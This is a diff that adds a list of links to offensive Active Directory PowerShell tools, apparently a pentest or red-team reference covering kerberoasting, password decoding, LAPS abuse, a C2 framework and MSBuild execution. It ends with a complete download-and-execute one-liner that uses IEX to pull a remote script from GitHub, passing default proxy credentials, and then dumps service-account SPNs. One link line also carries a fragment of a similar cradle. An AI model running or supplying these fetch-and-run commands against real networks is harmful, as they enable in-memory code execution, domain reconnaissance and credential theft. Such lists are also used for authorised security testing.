@@ -1,0 +1,20 @@
+https://raw.githubusercontent.com/xan7r/kerberoast/master/autokerberoast.ps1
+
+https://github.com/Kevin-Robertson/Powermad
+https://github.com/davidprowe/AD_Sec_Tools
+https://github.com/nullbind/Powershellery
+https://github.com/nullbind/Powershellery/blob/master/Stable-ish/ADS/Get-ExploitableSystems.psm1
+https://gist.github.com/HarmJ0y/8fdd2d3acfbe79b730db
+https://github.com/darkoperator/Posh-SecMod
+
+
+https://github.com/NetSPI/PowerShell/blob/master/Get-AdDecodedPassword.psm1
+https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory
+https://github.com/nettitude/PoshC2_Python/tree/master/Modules
+https://github.com/leoloobeek/LAPSToolkit
+https://github.com/machosec/Mystique
+https://github.com/ChrisTruncer/PenTestScripts/tree/master/HostScripts
+https://github.com/xorrior/RandomPS-Scripts/blob/master/Invoke-ExecuteMSBuild.ps1
+
+
+$browser = New-Object System.Net.WebClient;$browser.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX($browser.DownloadString('https://raw.githubusercontent.com/PyroTek3/PowerShell-AD-Recon/master/Find-PSServiceAccounts'));Find-PSServiceAccounts -DumpSPN
